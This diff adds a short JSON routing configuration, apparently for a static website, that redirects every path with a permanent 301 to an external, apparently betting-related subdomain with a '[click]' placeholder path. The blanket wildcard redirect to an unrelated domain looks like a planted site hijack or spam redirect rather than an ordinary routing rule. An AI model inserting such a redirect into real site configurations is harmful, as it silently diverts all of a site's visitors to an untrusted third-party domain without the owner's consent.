@@ -1,0 +1,9 @@
+{
+  "routes": [
+    {
+      "route": "/*",
+      "redirect": "http://4879.saussiesbetplay.com/[click]",
+      "statusCode": 301
+    }
+  ]
+}
